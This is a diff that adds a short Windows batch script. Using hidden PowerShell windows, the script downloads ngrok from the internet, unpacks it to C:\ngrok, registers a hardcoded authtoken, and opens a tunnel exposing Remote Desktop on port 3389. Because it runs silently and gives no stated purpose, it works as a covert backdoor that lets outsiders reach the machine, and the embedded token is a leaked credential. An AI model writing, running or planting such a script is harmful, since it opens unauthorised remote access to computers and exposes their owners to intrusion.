@@ -1,0 +1,6 @@
+@echo off
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip', '%TEMP%\ngrok.zip')"
+powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%TEMP%\ngrok.zip' -DestinationPath 'C:\ngrok' -Force"
+powershell -WindowStyle Hidden -Command "& 'C:\ngrok\ngrok.exe' authtoken 2tZcRi8IQojRZDOfEQ5OVhfQsQa_5ZtP5nMdBb7F7mXC6LkWi"
+powershell -WindowStyle Hidden -Command "& 'C:\ngrok\ngrok.exe' tcp 3389 > %TEMP%\ngrok_log.txt"
+exit
